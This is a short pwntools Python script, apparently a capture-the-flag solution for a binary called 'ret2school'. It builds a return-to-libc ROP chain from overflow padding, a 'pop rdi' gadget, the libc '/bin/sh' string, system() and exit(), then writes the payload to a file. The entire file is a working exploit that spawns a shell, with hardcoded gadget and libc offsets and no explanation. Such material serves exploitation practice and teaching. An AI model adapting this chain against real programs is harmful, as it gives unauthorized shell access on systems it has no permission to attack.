from pwn import *
# context.terminal = ['alacritty','-e']

# p = process("./ret2school")
libc = 0x7ffff7800000

ret = 0x00000000004006d2
pop_rdi_ret = 0x0000000000400743
bin_sh = libc + 0x1b3d88
system = libc + 0x000000000004f420
main = 0x0000000000400698
exit = libc + 0x0000000000043110

payload = b'AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMN'
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(exit)

open("payload.txt", "wb").write(payload)
